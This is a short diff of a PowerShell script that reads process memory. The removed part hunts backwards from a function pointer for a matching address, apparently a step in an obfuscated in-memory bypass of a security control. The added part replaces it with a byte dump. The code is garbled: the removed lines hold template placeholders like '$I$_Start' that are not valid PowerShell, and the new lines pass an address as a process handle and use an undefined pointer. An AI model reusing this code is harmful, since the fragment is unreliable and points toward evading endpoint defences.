@@ -1,20 +1,16 @@
-$Handle = [APIs]::GetCurrentProcess()
-$Dummy = 0
-$ApiReturn = $false
+# Search Implementation
+$MemoryToScan = [byte[]]::new(0x1000) # Example buffer size
+$BytesRead = 0
+$Success = [ObfAPIs]::ReadProcessMemory($Address, [IntPtr]$Pointer, $MemoryToScan, $MemoryToScan.Length, [ref]$BytesRead)
 
-for ($j = $I$_Start; $j -lt $M$_Offset; $j += $N$_Offset) {
-    $PtrToSearch = [Int64]$FuncPtr - $j
-    $MemArr = [byte[]]::new($R$_Bytes)
-    $ApiReturn = [APIs]::ReadProcessMemory($Handle, $PtrToSearch, $MemArr, $R$_Bytes, [ref]$Dummy)
-    for ($i = 0; $i -lt $MemArr.Length; $i += 1) {
-        $Bytes = $MemArr[$i..($i + 7)]
-        $Pointer = [BitConverter]::ToInt64($Bytes, 0)
-        if ($Pointer -eq $Func) {
-            Write-Host "Found @ $($j): $($i)!"
-            $Memory = [Int64]$PtrToSearch + $i
-            break
-        }
+if ($Success) {
+    Write-Host "[*] Memory read successfully. Bytes read: $BytesRead"
+    for ($i = 0; $i -lt $MemoryToScan.Length; $i++) {
+        $Chunk = [BitConverter]::ToString($MemoryToScan[$i..($i + 7)])
+        Write-Host "[$i] Chunk: $Chunk"
     }
+} else {
+    Write-Host "[!] Memory read failed. Check permissions."
 }
-$Finish = Get-Date
-Write-Host "Execution Time: $((($Finish - $ObfInit).TotalSeconds)) seconds"
+
+Write-Host "[*] Script execution completed."
